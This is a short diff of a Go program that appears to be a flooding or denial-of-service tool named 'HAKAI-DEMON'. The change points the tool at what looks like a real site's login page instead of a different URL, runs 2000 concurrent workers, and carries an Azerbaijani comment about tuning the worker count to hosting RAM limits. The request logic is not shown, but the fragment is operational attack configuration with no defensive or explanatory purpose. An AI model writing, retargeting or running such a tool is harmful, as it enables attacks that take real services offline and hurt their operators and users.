@@ -11,7 +11,7 @@ import (
 )
 
 func main() {
-	target := "https://one-vv6543.com/?p=8o83"
+	target := "https://empro.az/#/login"
 	workers := 2000 // Railway RAM limitinə görə tənzimlənib
 
 	fmt.Printf("[!!!] HAKAI-DEMON START: %s\n", target)
